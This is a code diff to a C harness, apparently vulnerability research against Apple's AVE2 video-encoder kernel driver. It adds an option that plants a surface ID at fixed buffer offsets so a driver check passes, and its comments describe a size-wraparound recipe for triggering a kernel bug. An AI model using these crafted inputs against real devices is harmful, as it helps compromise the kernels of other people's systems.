@@ -1048,6 +1048,12 @@ int main(void) {
            此前所有 sel5 尝试都把 Prepare 结构体放在 +0x00，整体错位 0x10。 */
         const char *patch = getenv("AVE2_MS_PATCH");
         int m = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
+        /* w65-M: real IOSurface SID into iUCInfoSID (CheckParam_Start:222 gate) */
+        uint32_t h5sid = 0;
+        { const char *hs = getenv("AVE2_H5SID");
+          if (hs && !strcmp(hs, "auto")) h5sid = surf_make_id();
+          else if (hs && hs[0]) h5sid = (uint32_t)strtoul(hs, 0, 0); }
+        if (h5sid) printf("[h5sid] %u (0x%x)\n", h5sid, h5sid);
         printf("=== hdr5: create m%d -> sel4 -> sel5 with 16-byte cmd header ===\n", m);
         for (int casei = 0; casei < 8; casei++) {
             if (create_session(m, &c) != 0) { printf("[-] create at case %d\n", casei); break; }
@@ -1062,6 +1068,8 @@ int main(void) {
             uint8_t sub[0x1a0a0]; memset(sub, 0, sizeof(sub));
             memcpy(sub, stat_in, 0x1a0a0);
             if (patch) apply_patch(sub, patch);
+            if (h5sid) { *(uint32_t *)(sub + 0x28) = h5sid;   /* payload-relative iUCInfoSID (struct@+0x10 -> abs +0x38) */
+                         *(uint32_t *)(d5 + 0x38) = h5sid; }   /* absolute too in case pIn=input */
             if (casei == 7) {
                 /* LRB 回绕配方：flags=1(s=2) B=C=0x10000 D=E=4 => X=Y=0x10000, F3 回绕 0 */
                 *(uint32_t *)(sub + 0x254) = 1;
